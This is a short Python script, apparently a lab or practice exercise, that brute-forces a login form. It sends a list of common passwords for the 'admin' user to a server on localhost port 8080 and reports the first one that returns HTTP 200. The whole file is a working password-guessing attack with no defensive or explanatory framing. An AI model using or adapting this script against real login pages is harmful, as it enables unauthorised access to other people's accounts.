import requests

password_list = ["123456", "password", "admin", "letmein", "welcome", "Gravity@5237", "qwerty"]
for pwd in password_list:
    data = {
        "username": "admin", 
        "password": pwd}
    r = requests.post("http://127.0.0.1:8080", data=data)

    print(f"Trying password: {pwd} - Status Code: {r.status_code}")
    if r.status_code == 200:
        print("Password Found:", pwd)
        break

